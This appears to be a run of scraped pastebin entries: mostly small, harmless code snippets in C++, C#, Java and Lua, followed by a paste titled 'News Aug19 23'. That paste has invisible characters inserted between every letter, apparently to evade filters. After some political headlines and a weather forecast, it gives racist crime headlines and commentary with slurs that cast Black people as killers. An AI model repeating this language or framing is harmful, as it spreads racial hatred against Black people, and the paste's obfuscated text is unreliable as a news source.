void _print(vector<T> v);
template <class T>
void _print(set<T> v);
template <class T, class V>
void _print(map<T, V> v);
template <class T>
void _print(multiset<T> v);
template <class T, class V>
void _print(pair<T, V> p)
{
    cerr << ""{"";
    _print(p.F);
    cerr << "","";
    _print(p.S);
    cerr << ""} "";
}
template <class T>
void _print(vector<T> v)
{
    cerr << ""[ "";
    for (T i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T>
void _print(set<T> v)
{
    cerr << ""[ "";
    for (T i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T>
void _print(multiset<T> v)
{
    cerr << ""[ "";
    for (T i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T, class V>
void _print(map<T, V> v)
{
    cerr << ""[ "";
    for (auto i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T, class V>
void _print(unordered_map<T, V> v)
{
    cerr << ""[ "";
    for (auto i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}

/////////////Sieve///////////////
// vb sieve(N + 5, true);
// vi primes;
// void gensieve()
// {
//     sieve[0] = sieve[1] = false;
//     for (int i = 2; i <= sqrt(N); i++)
//     {
//         if (sieve[i])
//         {
//             for (int j = i * i; j <= N; j += i)
//                 sieve[j] = false;
//         }
//     }
//     for (int i = 2; i <= N; i++)
//     {
//         if (sieve[i])
//             primes.pb(i);
//     }
// }
////////////////////////////////

int binpow(int a, int b, int m)
{
    a %= m;
    int ans = 1;
    while (b > 0)
    {
        if (b & 1)
        {
            ans = (ans * a) % MOD;
        }
        a = (a * a) % MOD;
        b >>= 1;
    }
    return ans;
}

int modadd(int a, int b)
{
    return (a % MOD + b % MOD) % MOD;
}
int modsub(int a, int b)
{
    return ((a % MOD - b % MOD) % MOD + MOD) % MOD;
}
int modmul(int a, int b)
{
    return (a % MOD * b % MOD) % MOD;
}
int moddiv(int a, int b)
{
    return ((a % MOD) * (binpow(b, MOD - 2, MOD))) % MOD;
}

int lbnd(vi &v, int x)
{
    int n = v.size();
    int low = 0;
    int high = n - 1;
    int ans = -1;
    while (low <= high)
    {
        int mid = (low + high) >> 1;
        if (v[mid] <= x)
        {
            ans = mid;
            low = mid + 1;
        }
        else
        {
            high = mid - 1;
        }
    }
    return ans;
}

int ubnd(vi &v, int x)
{
    int n = v.size();
    int low = 0;
    int high = n - 1;
    int ans = -1;
    while (low <= high)
    {
        int mid = (low + high) >> 1;
        if (v[mid] >= x)
        {
            ans = mid;
            high = mid - 1;
        }
        else
        {
            low = mid + 1;
        }
    }
    return ans;
}

vpi moves = {{0, 1}, {1, 0}, {0, -1}, {-1, 0}};
// vi graph[N + 1];
// vb visited(N + 1, false);
// vi parent(N + 1, -1);
// vi level(N + 1, 0);

// void bfs(vi *graph, vb &visited, vi &parent, vi &level, int start)
// {
//     queue<int> q;
//     visited[start] = true;
//     q.push(start);
//     while (!q.empty())
//     {
//         int node = q.front();
//         traverse(i, graph[node])
//         {
//             if (!visited[i])
//             {
//                 if (parent[i] == -1)
//                     parent[i] = node;
//                 if (level[i] == 0)
//                     level[i] = 1 + level[node];
//                 visited[i] = true;
//                 q.push(i);
//             }
//         }
//         q.pop();
//     }
// }

// void dfs(vi *graph, vb &visited, int start)
// {
//     visited[start] = true;
//     traverse(i, graph[start])
//     {
//         if (!visited[i])
//         {
//             visited[i] = true;
//             dfs(graph, visited, i);
//         }
//     }
// }

void fast()
{
    ios_base::sync_with_stdio(false);
    cin.tie(NULL);
    cout.tie(NULL);
}

void init_code()
{
#ifndef ONLINE_JUDGE
    freopen(""input.txt"", ""r"", stdin);
    freopen(""output.txt"", ""w"", stdout);
    freopen(""error.txt"", ""w"", stderr);
#endif // ONLINE_JUDGE
}

bool isValid(int a, int b, int n)
{
    return ((a < n && a >= 0) && (b < n && b >= 0));
}

void dfs(vector<vi> &grid, vector<vb> &visited, int a, int b, int &ans)
{
    visited[a][b] = true;
    ans++;

    for (auto i : moves)
    {
        int x = a + i.F;
        int y = b + i.S;
        if (isValid(x, y, grid.size()))
            if (!visited[x][y])
            {
                dfs(grid, visited, x, y, ans);
            }
    }

    return;
}

void solve()
{
    int n, a, b;
    cin >> n >> a >> b;
    a--;
    b--;

    vector<vi> grid(n, vi(n));
    vector<vb> visited(n, vb(n, false));

    int ans = 1;

    for (auto i : moves)
    {
        int x = 0;
        dfs(grid, visited, a, b, x);
        dbg(x);
        ans = max(ans, x);
    }
    println(ans);
}

signed main()
{
    init_code();
    fast();
    int t = 1;
    cin >> t;
    // gensieve();
    while (t--)
    {
        solve();
    }
    return 0;
}
"
8PdRBHi9,Untitled,Alexander_Maximov,C#,Saturday 19th of August 2023 10:04:07 AM CDT,"using System;
using System.Collections.Generic;

namespace Sortirovka
{
    public class Array
    {
        Random _random = new Random();

        public List<double> CreateNewArray()
        {
            List<double> newArray = new List<double>(40);

            for (int i = 0; i < newArray.Capacity; i++)
            {
                newArray.Add(Math.Round(_random.NextDouble() * 2, 1));
            }

            return newArray;
        }

        public List<double> CleanArray(List<double> array)
        {
            List<double> cleanArray = new List<double>();

            for (int i = 0; i < array.Count; i++)
            {
                if (array[i] % 1 == 0)
                {
                    cleanArray.Add(array[i]);
                }
            }

            return cleanArray;
        }

        public void ShowArray(List<double> array)
        {
            for (int i = 0; i < array.Count; i++)
            {
                Console.Write($""{array[i]} "");
            }
        }
    }
}"
SCnXYGKz,Untitled,Alexander_Maximov,C#,Saturday 19th of August 2023 10:03:44 AM CDT,"using System;
using System.Collections.Generic;

namespace Sortirovka
{
    internal class Program
    {
        public static void Main(string[] args)
        {
            Array array = new Array();
            List<double> newArray = new List<double>();
            newArray = array.CreateNewArray();
            array.ShowArray(newArray);
            Console.WriteLine();
            
            List<double> cleanArray = new List<double>();
            cleanArray = array.CleanArray(newArray);
            array.ShowArray(cleanArray);
        }
    }
}"
gV0C1pec,es2,davegimo,Java,Saturday 19th of August 2023 09:47:57 AM CDT,"class Node {

    public int value;
    public String q;
    public Node left;
    public Node right;

    public Node(int value, String q) {
        this.value = value;
        this.q = q;
        right = null;
        left = null;
    }
}


public class BinaryTree {

    public Node root;

    public Node addRecursive(Node current, int value, String q) {
        if (current == null) {
            return new Node(value,q);
        }
    
        if (value < current.value) {
            current.left = addRecursive(current.left, value, q);
        } else if (value >= current.value) {
            current.right = addRecursive(current.right, value, q);
        } else {
            // value already exists
            return current;
        }
    
        return current;
    }

    public void add(int value, String q) {
        root = addRecursive(root, value, q);
    }

   

    public static void main(String[] args) {
        BinaryTree bt = new BinaryTree();
    
        bt.add(170, ""albergo"");
        bt.add(130, ""campionato"");
        bt.add(90, ""fiume"");
        bt.add(20, ""patate"");
        bt.add(8, ""frutta"");
        bt.add(222, ""eletto"");
        bt.add(51, ""sentieri"");

        System.out.println(bt.root.left.left.value);
        System.out.println(bt.root.left.left.q);
        
    }
}"
15QkMRpL,Untitled,kirkarr,Lua,Saturday 19th of August 2023 09:35:17 AM CDT,"local monitor = peripheral.find(""monitor"")
term.redirect(monitor)
term.clear()
local sx,sy = term.getSize()
while true do
	term.setCursorPos(1,1)
	term.write(textutils.formatTime(os.time()))
	term.setCursorPos(1,2)
	term.write(""Welcome to tea-bar"")  
	os.sleep(0.1)
end"
D41wAMrw,strhdygjklhgdfsdrghjk,crackanddie,Java,Saturday 19th of August 2023 09:00:02 AM CDT,"public static void main(String[] args) throws InterruptedException, IOException {

        Holder.LOG_LEVEL = Holder.LOG_ALL;
        RobocadVMXTitan robot = new RobocadVMXTitan(false);

        long millis = LocalTime.now(ZoneOffset.UTC).get(ChronoField.MILLI_OF_DAY);
        while (LocalTime.now(ZoneOffset.UTC).get(ChronoField.MILLI_OF_DAY) - millis < 20000)
        {
            robot.setMotorSpeed0(-20);
            robot.setMotorSpeed1(20);
        }
        robot.setMotorSpeed0(0);
        robot.setMotorSpeed1(0);
        Thread.sleep(1000);
        robot.stop();
    }"
70hv8cZY,News Aug19 23,Newscaster_Ned,Email,Saturday 19th of August 2023 08:59:17 AM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

W‎e‎l‎l‎ ‎2‎0‎2‎3‎ ‎i‎s‎ ‎t‎h‎e‎ ‎w‎o‎r‎s‎t‎ ‎y‎e‎a‎r‎ ‎e‎v‎e‎r‎!‎ ‎S‎u‎c‎k‎ ‎i‎t‎,‎ ‎2‎0‎2‎2‎!‎

H‎i‎l‎a‎r‎y‎ ‎C‎a‎t‎ ‎4‎

C‎o‎n‎e‎:‎ ‎S‎o‎c‎a‎l‎ ‎t‎o‎ ‎G‎e‎t‎ ‎C‎r‎u‎s‎h‎e‎d‎

F‎i‎r‎s‎t‎ ‎T‎r‎o‎p‎i‎c‎a‎l‎ ‎S‎t‎o‎r‎m‎ ‎W‎a‎t‎c‎h‎ ‎i‎n‎ ‎C‎a‎l‎i‎f‎o‎r‎n‎i‎a‎ ‎H‎i‎s‎t‎o‎r‎y‎

A‎r‎e‎ ‎T‎h‎e‎y‎ ‎R‎e‎a‎d‎y‎?‎
H‎u‎r‎r‎i‎c‎a‎n‎e‎ ‎H‎i‎l‎a‎r‎y‎ ‎(‎N‎O‎A‎A‎ ‎v‎i‎a‎ ‎A‎s‎s‎o‎c‎i‎a‎t‎e‎d‎ ‎P‎r‎e‎s‎s‎)‎
H‎u‎r‎r‎i‎c‎a‎n‎e‎ ‎H‎i‎l‎a‎r‎y‎ ‎r‎e‎a‎c‎h‎e‎d‎ ‎C‎a‎t‎e‎g‎o‎r‎y‎ ‎4‎ ‎s‎t‎a‎t‎u‎s‎ ‎o‎n‎ ‎F‎r‎i‎d‎a‎y‎ ‎m‎o‎r‎n‎i‎n‎g‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎N‎a‎t‎i‎o‎n‎a‎l‎ ‎H‎u‎r‎r‎i‎c‎a‎n‎e‎ ‎C‎e‎n‎t‎e‎r‎ ‎i‎s‎s‎u‎e‎d‎ ‎i‎t‎s‎ ‎f‎i‎r‎s‎t‎-‎e‎v‎e‎r‎ ‎t‎r‎o‎p‎i‎c‎a‎l‎ ‎s‎t‎o‎r‎m‎ ‎w‎a‎t‎c‎h‎ ‎f‎o‎r‎ ‎S‎o‎u‎t‎h‎e‎r‎n‎ ‎C‎a‎l‎i‎f‎o‎r‎n‎i‎a‎,‎ ‎a‎s‎ ‎t‎h‎e‎ ‎e‎n‎t‎i‎r‎e‎ ‎s‎o‎u‎t‎h‎w‎e‎s‎t‎e‎r‎n‎ ‎r‎e‎g‎i‎o‎n‎ ‎b‎r‎a‎c‎e‎s‎ ‎f‎o‎r‎ ‎h‎e‎a‎v‎y‎ ‎r‎a‎i‎n‎s‎,‎ ‎h‎i‎g‎h‎ ‎s‎u‎r‎f‎,‎ ‎a‎n‎d‎ ‎f‎l‎a‎s‎h‎ ‎f‎l‎o‎o‎d‎i‎n‎g‎.‎

C‎o‎m‎e‎r‎ ‎D‎e‎m‎a‎n‎d‎s‎ ‎D‎o‎c‎u‎m‎e‎n‎t‎s‎ ‎f‎o‎r‎ ‎V‎P‎ ‎B‎i‎d‎e‎n‎'‎s‎ ‎S‎e‎c‎r‎e‎t‎ ‎P‎s‎e‎u‎d‎o‎n‎y‎m‎:‎ ‎'‎R‎o‎b‎e‎r‎t‎ ‎L‎.‎ ‎P‎e‎t‎e‎r‎s‎'‎
C‎o‎m‎e‎r‎ ‎D‎e‎m‎a‎n‎d‎s‎ ‎D‎o‎c‎u‎m‎e‎n‎t‎s‎ ‎f‎o‎r‎ ‎V‎P‎ ‎B‎i‎d‎e‎n‎'‎s‎ ‎S‎e‎c‎r‎e‎t‎ ‎P‎s‎e‎u‎d‎o‎n‎y‎m‎:‎ ‎'‎R‎o‎b‎e‎r‎t‎ ‎L‎.‎ ‎P‎e‎t‎e‎r‎s‎'‎
8‎,‎5‎5‎1‎

A‎r‎m‎e‎d‎ ‎I‎R‎S‎ ‎A‎g‎e‎n‎t‎ ‎A‎c‎c‎i‎d‎e‎n‎t‎a‎l‎l‎y‎ ‎K‎i‎l‎l‎s‎ ‎A‎n‎o‎t‎h‎e‎r‎ ‎A‎g‎e‎n‎t‎ ‎D‎u‎r‎i‎n‎g‎ ‎R‎a‎n‎g‎e‎ ‎T‎i‎m‎e‎
1‎,‎0‎9‎8‎
T‎r‎u‎m‎p‎ ‎C‎a‎n‎c‎e‎l‎s‎ ‎'‎M‎a‎j‎o‎r‎ ‎N‎e‎w‎s‎ ‎C‎o‎n‎f‎e‎r‎e‎n‎c‎e‎'‎ ‎o‎n‎ ‎L‎a‎t‎e‎s‎t‎ ‎I‎n‎d‎i‎c‎t‎m‎e‎n‎t‎
T‎r‎u‎m‎p‎ ‎C‎a‎n‎c‎e‎l‎s‎ ‎'‎M‎a‎j‎o‎r‎ ‎N‎e‎w‎s‎ ‎C‎o‎n‎f‎e‎r‎e‎n‎c‎e‎'‎ ‎o‎n‎ ‎L‎a‎t‎e‎s‎t‎ ‎I‎n‎d‎i‎c‎t‎m‎e‎n‎t‎
6‎,‎4‎0‎1‎
C‎a‎l‎i‎f‎o‎r‎n‎i‎a‎ ‎B‎i‎l‎l‎ ‎M‎a‎y‎ ‎C‎r‎i‎m‎i‎n‎a‎l‎i‎z‎e‎ ‎P‎a‎r‎e‎n‎t‎s‎'‎ ‎P‎r‎o‎t‎e‎s‎t‎s‎ ‎a‎t‎ ‎S‎c‎h‎o‎o‎l‎ ‎B‎o‎a‎r‎d‎ ‎M‎e‎e‎t‎i‎n‎g‎s‎
C‎a‎l‎i‎f‎o‎r‎n‎i‎a‎ ‎B‎i‎l‎l‎ ‎M‎a‎y‎ ‎C‎r‎i‎m‎i‎n‎a‎l‎i‎z‎e‎ ‎P‎a‎r‎e‎n‎t‎s‎'‎ ‎P‎r‎o‎t‎e‎s‎t‎s‎ ‎a‎t‎ ‎S‎c‎h‎o‎o‎l‎ ‎B‎o‎a‎r‎d‎ ‎M‎e‎e‎t‎i‎n‎g‎s‎
4‎5‎4‎

P‎o‎l‎l‎a‎k‎ ‎o‎n‎ ‎S‎a‎v‎a‎g‎e‎:‎ ‎T‎r‎u‎m‎p‎ ‎C‎o‎u‎l‎d‎ ‎T‎a‎k‎e‎ ‎O‎a‎t‎h‎ ‎o‎f‎ ‎O‎f‎f‎i‎c‎e‎ ‎i‎n‎ ‎P‎r‎i‎s‎o‎n‎ ‎a‎n‎d‎ ‎W‎a‎l‎k‎ ‎F‎r‎e‎e‎
9‎7‎4‎
T‎r‎u‎m‎p‎ ‎o‎n‎ ‎G‎e‎o‎r‎g‎i‎a‎ ‎I‎n‎d‎i‎c‎t‎m‎e‎n‎t‎:‎ ‎C‎o‎n‎t‎i‎n‎u‎a‎t‎i‎o‎n‎ ‎o‎f‎ ‎a‎ ‎W‎i‎t‎c‎h‎ ‎H‎u‎n‎t‎ ‎-‎-‎ ‎T‎h‎e‎y‎’‎r‎e‎ ‎S‎i‎c‎k‎
T‎r‎u‎m‎p‎ ‎o‎n‎ ‎G‎e‎o‎r‎g‎i‎a‎ ‎I‎n‎d‎i‎c‎t‎m‎e‎n‎t‎:‎ ‎C‎o‎n‎t‎i‎n‎u‎a‎t‎i‎o‎n‎ ‎o‎f‎ ‎a‎ ‎W‎i‎t‎c‎h‎ ‎H‎u‎n‎t‎ ‎-‎-‎ ‎T‎h‎e‎y‎’‎r‎e‎ ‎S‎i‎c‎k‎
6‎,‎4‎1‎7‎
R‎e‎p‎o‎r‎t‎:‎ ‎M‎e‎d‎i‎a‎ ‎T‎y‎c‎o‎o‎n‎ ‎R‎u‎p‎e‎r‎t‎ ‎M‎u‎r‎d‎o‎c‎h‎ ‎P‎r‎o‎d‎d‎e‎d‎ ‎Y‎o‎u‎n‎g‎k‎i‎n‎ ‎t‎o‎ ‎L‎a‎u‎n‎c‎h‎ ‎W‎H‎ ‎B‎i‎d‎
R‎e‎p‎o‎r‎t‎:‎ ‎M‎e‎d‎i‎a‎ ‎T‎y‎c‎o‎o‎n‎ ‎R‎u‎p‎e‎r‎t‎ ‎M‎u‎r‎d‎o‎c‎h‎ ‎P‎r‎o‎d‎d‎e‎d‎ ‎Y‎o‎u‎n‎g‎k‎i‎n‎ ‎t‎o‎ ‎L‎a‎u‎n‎c‎h‎ ‎W‎H‎ ‎B‎i‎d‎
3‎3‎6‎

B‎o‎y‎c‎o‎t‎t‎ ‎O‎v‎e‎r‎:‎ ‎K‎i‎d‎ ‎R‎o‎c‎k‎ ‎D‎r‎i‎n‎k‎s‎ ‎B‎u‎d‎ ‎L‎i‎g‎h‎t‎ ‎A‎g‎a‎i‎n‎ ‎
5‎2‎8‎
P‎o‎l‎l‎:‎ ‎R‎a‎m‎a‎s‎w‎a‎m‎y‎ ‎S‎u‎r‎g‎e‎s‎ ‎t‎o‎ ‎S‎e‎c‎o‎n‎d‎ ‎P‎l‎a‎c‎e‎ ‎o‎v‎e‎r‎ ‎D‎e‎S‎a‎n‎t‎i‎s‎,‎ ‎T‎r‎u‎m‎p‎ ‎U‎p‎ ‎4‎0‎
P‎o‎l‎l‎:‎ ‎R‎a‎m‎a‎s‎w‎a‎m‎y‎ ‎S‎u‎r‎g‎e‎s‎ ‎t‎o‎ ‎S‎e‎c‎o‎n‎d‎ ‎P‎l‎a‎c‎e‎ ‎o‎v‎e‎r‎ ‎D‎e‎S‎a‎n‎t‎i‎s‎,‎ ‎T‎r‎u‎m‎p‎ ‎U‎p‎ ‎4‎0‎
1‎,‎8‎4‎4‎
R‎e‎p‎o‎r‎t‎:‎ ‎D‎e‎S‎a‎n‎t‎i‎s‎ ‎S‎u‎p‎e‎r‎ ‎P‎A‎C‎ ‎P‎o‎s‎t‎s‎ ‎P‎l‎a‎n‎ ‎t‎o‎ ‎'‎H‎a‎m‎m‎e‎r‎'‎ ‎R‎a‎m‎a‎s‎w‎a‎m‎y‎ ‎i‎n‎ ‎D‎e‎b‎a‎t‎e‎
R‎e‎p‎o‎r‎t‎:‎ ‎D‎e‎S‎a‎n‎t‎i‎s‎ ‎S‎u‎p‎e‎r‎ ‎P‎A‎C‎ ‎P‎o‎s‎t‎s‎ ‎P‎l‎a‎n‎ ‎t‎o‎ ‎'‎H‎a‎m‎m‎e‎r‎'‎ ‎R‎a‎m‎a‎s‎w‎a‎m‎y‎ ‎i‎n‎ ‎D‎e‎b‎a‎t‎e‎

C‎o‎u‎r‎t‎ ‎D‎o‎c‎u‎m‎e‎n‎t‎s‎ ‎R‎e‎l‎e‎a‎s‎e‎d‎ ‎D‎e‎s‎c‎r‎i‎b‎i‎n‎g‎ ‎B‎r‎u‎t‎a‎l‎ ‎M‎u‎r‎d‎e‎r‎ ‎o‎f‎ ‎E‎l‎d‎e‎r‎l‎y‎ ‎W‎h‎i‎t‎e‎ ‎C‎o‎u‎p‎l‎e‎ ‎i‎n‎ ‎F‎l‎o‎r‎i‎d‎a‎ ‎R‎e‎t‎i‎r‎e‎m‎e‎n‎t‎ ‎H‎o‎m‎e‎ ‎b‎y‎ ‎N‎e‎g‎r‎e‎s‎s‎.‎

W‎e‎l‎l‎ ‎m‎a‎y‎b‎e‎ ‎o‎n‎e‎ ‎d‎a‎y‎ ‎w‎e‎'‎l‎l‎ ‎f‎i‎n‎d‎ ‎o‎u‎t‎ ‎w‎h‎y‎ ‎t‎h‎i‎s‎ ‎b‎i‎t‎c‎h‎ ‎d‎i‎d‎ ‎t‎h‎i‎s‎.‎.‎.‎ ‎P‎r‎o‎b‎a‎b‎l‎y‎ ‎n‎o‎t‎.‎


H‎e‎a‎r‎t‎l‎e‎s‎s‎ ‎N‎e‎g‎r‎o‎ ‎K‎i‎l‎l‎s‎ ‎F‎a‎t‎h‎e‎r‎,‎ ‎4‎ ‎Y‎e‎a‎r‎-‎O‎l‎d‎,‎ ‎T‎h‎e‎n‎ ‎R‎i‎p‎s‎ ‎O‎u‎t‎ ‎W‎o‎m‎a‎n‎'‎s‎ ‎H‎e‎a‎r‎t‎ ‎a‎n‎d‎ ‎E‎a‎t‎s‎ ‎i‎t‎.‎


E‎x‎e‎c‎u‎t‎i‎o‎n‎ ‎D‎a‎t‎e‎ ‎S‎e‎t‎ ‎f‎o‎r‎ ‎C‎o‎o‎n‎ ‎W‎h‎o‎ ‎K‎i‎l‎l‎e‎d‎ ‎2‎ ‎W‎h‎i‎t‎e‎ ‎P‎e‎o‎p‎l‎e‎ ‎i‎n‎ ‎T‎h‎e‎i‎r‎ ‎F‎l‎o‎r‎i‎d‎a‎ ‎H‎o‎m‎e‎ ‎B‎e‎f‎o‎r‎e‎ ‎R‎o‎b‎b‎i‎n‎g‎ ‎a‎n‎o‎t‎h‎e‎r‎ ‎P‎l‎a‎c‎e‎.‎


M‎a‎n‎d‎i‎n‎g‎o‎ ‎C‎h‎a‎r‎g‎e‎d‎ ‎i‎n‎ ‎S‎l‎a‎y‎i‎n‎g‎ ‎o‎f‎ ‎(‎M‎u‎d‎s‎h‎a‎r‎k‎)‎ ‎B‎u‎s‎i‎n‎e‎s‎s‎ ‎P‎a‎r‎t‎n‎e‎r‎ ‎i‎n‎ ‎M‎o‎n‎t‎g‎o‎m‎e‎r‎y‎ ‎C‎o‎u‎n‎t‎y‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

T‎o‎d‎a‎y‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
1‎0‎5‎°‎
/‎7‎6‎°‎
4‎%‎
S‎ ‎8‎ ‎m‎p‎h‎
S‎a‎t‎ ‎1‎9‎ ‎|‎ ‎D‎a‎y‎
1‎0‎5‎°‎
4‎%‎
S‎
8‎
 ‎
m‎p‎h‎
S‎o‎m‎e‎ ‎c‎l‎o‎u‎d‎s‎ ‎t‎h‎i‎s‎ ‎m‎o‎r‎n‎i‎n‎g‎ ‎w‎i‎l‎l‎ ‎g‎i‎v‎e‎ ‎w‎a‎y‎ ‎t‎o‎ ‎g‎e‎n‎e‎r‎a‎l‎l‎y‎ ‎s‎u‎n‎n‎y‎ ‎s‎k‎i‎e‎s‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎a‎f‎t‎e‎r‎n‎o‎o‎n‎.‎ ‎N‎e‎a‎r‎ ‎r‎e‎c‎o‎r‎d‎ ‎h‎i‎g‎h‎ ‎t‎e‎m‎p‎e‎r‎a‎t‎u‎r‎e‎s‎.‎ ‎H‎i‎g‎h‎ ‎a‎r‎o‎u‎n‎d‎ ‎1‎0‎5‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎ ‎a‎t‎ ‎5‎ ‎t‎o‎ ‎1‎0‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
5‎5‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
E‎x‎t‎r‎e‎m‎e‎
S‎u‎n‎r‎i‎s‎e‎
7‎:‎0‎0‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
8‎:‎0‎7‎ ‎p‎m‎
S‎a‎t‎ ‎1‎9‎ ‎|‎ ‎N‎i‎g‎h‎t‎
7‎6‎°‎
7‎%‎
S‎
9‎
 ‎
m‎p‎h‎
C‎l‎e‎a‎r‎ ‎s‎k‎i‎e‎s‎.‎ ‎L‎o‎w‎ ‎7‎6‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎ ‎a‎t‎ ‎5‎ ‎t‎o‎ ‎1‎0‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
6‎3‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
9‎:‎4‎5‎ ‎a‎m‎
W‎a‎x‎i‎n‎g‎ ‎C‎r‎e‎s‎c‎e‎n‎t‎
M‎o‎o‎n‎s‎e‎t‎
1‎0‎:‎0‎3‎ ‎p‎m‎
S‎u‎n‎ ‎2‎0‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
1‎0‎6‎°‎
/‎7‎7‎°‎
7‎%‎
S‎S‎E‎ ‎9‎ ‎m‎p‎h‎
M‎o‎n‎ ‎2‎1‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
1‎0‎6‎°‎
/‎7‎7‎°‎
3‎%‎
S‎E‎ ‎1‎3‎ ‎m‎p‎h‎
T‎u‎e‎ ‎2‎2‎
P‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
9‎7‎°‎
/‎7‎5‎°‎
3‎9‎%‎
E‎ ‎1‎6‎ ‎m‎p‎h‎
W‎e‎d‎ ‎2‎3‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
1‎0‎2‎°‎
/‎7‎5‎°‎
8‎%‎
E‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎4‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
1‎0‎5‎°‎
/‎7‎6‎°‎
6‎%‎
N‎E‎ ‎9‎ ‎m‎p‎h‎
F‎r‎i‎ ‎2‎5‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
1‎0‎6‎°‎
/‎7‎8‎°‎
5‎%‎
S‎E‎ ‎8‎ ‎m‎p‎h‎
S‎a‎t‎ ‎2‎6‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
1‎0‎6‎°‎
/‎7‎8‎°‎
2‎%‎
N‎W‎ ‎8‎ ‎m‎p‎h‎
S‎u‎n‎ ‎2‎7‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
1‎0‎5‎°‎
/‎7‎8‎°‎
1‎8‎%‎
N‎ ‎1‎0‎ ‎m‎p‎h‎
M‎o‎n‎ ‎2‎8‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
1‎0‎4‎°‎
/‎7‎5‎°‎
2‎2‎%‎
N‎E‎ ‎9‎ ‎m‎p‎h‎
T‎u‎e‎ ‎2‎9‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
1‎0‎4‎°‎
/‎7‎4‎°‎
2‎%‎
E‎ ‎9‎ ‎m‎p‎h‎
W‎e‎d‎ ‎3‎0‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
1‎0‎3‎°‎
/‎7‎5‎°‎
2‎1‎%‎
E‎N‎E‎ ‎8‎ ‎m‎p‎h‎
T‎h‎u‎ ‎3‎1‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
1‎0‎2‎°‎
/‎7‎5‎°‎
2‎4‎%‎
S‎S‎E‎ ‎9‎ ‎m‎p‎h‎
F‎r‎i‎ ‎0‎1‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
1‎0‎3‎°‎
/‎7‎6‎°‎
1‎3‎%‎
S‎ ‎9‎ ‎m‎p‎h‎
S‎a‎t‎ ‎0‎2‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
1‎0‎2‎°‎
/‎7‎5‎°‎
2‎3‎%‎
S‎ ‎1‎0‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎H‎u‎r‎r‎i‎c‎a‎n‎e‎ ‎H‎i‎l‎a‎r‎y‎.‎ ‎👱🏼‍♀️

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

S‎a‎t‎a‎n‎i‎s‎t‎
